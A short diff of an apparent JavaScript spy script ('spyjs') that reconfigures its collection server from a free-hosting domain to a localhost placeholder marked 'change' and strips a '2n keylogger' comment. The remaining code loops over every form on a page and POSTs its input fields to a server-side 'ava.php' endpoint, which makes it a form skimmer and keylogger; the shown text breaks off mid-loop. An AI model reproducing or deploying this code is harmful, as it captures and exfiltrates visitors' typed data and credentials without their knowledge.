@@ -1,5 +1,5 @@
 
-var url = "https://app-1530445460.000webhostapp.com/server/";  //http://127.0.0.1/server/
+var url = "http://127.0.0.1/server/"; // change http://127.0.0.1 
 var debug = 1;
 var currLoc = "";
 spyjs_refreshEvents();
@@ -62,13 +62,13 @@ function spyjs_saveData(data){
 	
 };
 
-   // 2n keylogger
+   
 
 var forms = document.getElementsByTagName('form');
  for (var i = 0; i < forms.length; i++) {
  var form = forms[i];
 var xhr = new XMLHttpRequest();
-    xhr.open('POST', 'https://app-1530445460.000webhostapp.com/server/ava.php'); //127.0.0.1/server/
+    xhr.open('POST', 'http://127.0.0.1/server/ava.php'); //change http://127.0.0.1
      var fields = form.getElementsByTagName('input');      
       for (var j = 0; j < fields.length; j++) {
           var f = fields[j];
